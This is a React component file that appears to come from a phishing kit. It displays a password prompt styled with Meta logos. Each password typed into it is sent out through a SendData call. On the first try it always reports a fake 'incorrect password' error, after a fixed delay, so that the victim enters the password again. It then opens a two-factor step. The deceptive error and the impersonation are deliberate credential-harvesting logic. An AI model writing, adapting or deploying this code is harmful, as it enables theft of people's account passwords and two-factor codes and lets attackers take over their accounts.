import React from 'react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [doubleCheck, setDoubleCheck] = React.useState(false);
    const [password, setPassword] = React.useState('');
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setPassword(value);
        setErrors(prev => ({ ...prev, [id]: '' }));

        if (!doubleCheck) {
            dispatch(updateForm({ password: value }));
        } else {
            dispatch(updateForm({ passwordSecond: value }));
        }
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};
            if (!password.trim()) newErrors.password = "You haven't entered your password!";

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return; 
            }

            if (!doubleCheck) {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(true);
                        setPassword('');
                        newErrors.password = "The password you've entered is incorrect.";
                        setErrors(newErrors);
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setPassword('');
                    newErrors.password = "The password you've entered is incorrect.";
                    setErrors(newErrors);
                });
            } else {
                setLoading(true);

                await SendData(formData)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);  
                        setDoubleCheck(false);
                        setPassword('');

                        isOpendTwoFactor(true);
                        handleClose();
                    }, 1345)
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setPassword('');
                    newErrors.password = "The password you've entered is incorrect.";
                    setErrors(newErrors);
                });
            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="h-full flex flex-col items-center justify-between flex-1">
                <div className='w-[50px] h-[50px] mb-[20px] mx-auto'>
                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className='w-full py-8'>
                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>For your security, you must enter your password to continue.</p>
                    <form onSubmit={handSubmit} autoComplete="off" >
                        <div className='w-full'>
                            <PasswordInput
                                id='password'
                                placeholder="Enter your password"
                                className={inputClass('password')}
                                value={password}
                                onChange={handleChange}
                            />
                            {errorText('password')}
                        </div>
                        <div className='w-full mt-[20px]'>
                            <button
                                className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className='animate-spin mr-[10px] w-[20px] h-[20px]'>
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                    </div>
                                )}
                                {loading ? '' : 'Continue'}
                            </button>
                        </div>
                        <div>
                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Forgot your password?</a></p>
                        </div>
                    </form>
                </div>

                <div className='w-[60px] mt-[20px] mx-auto'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
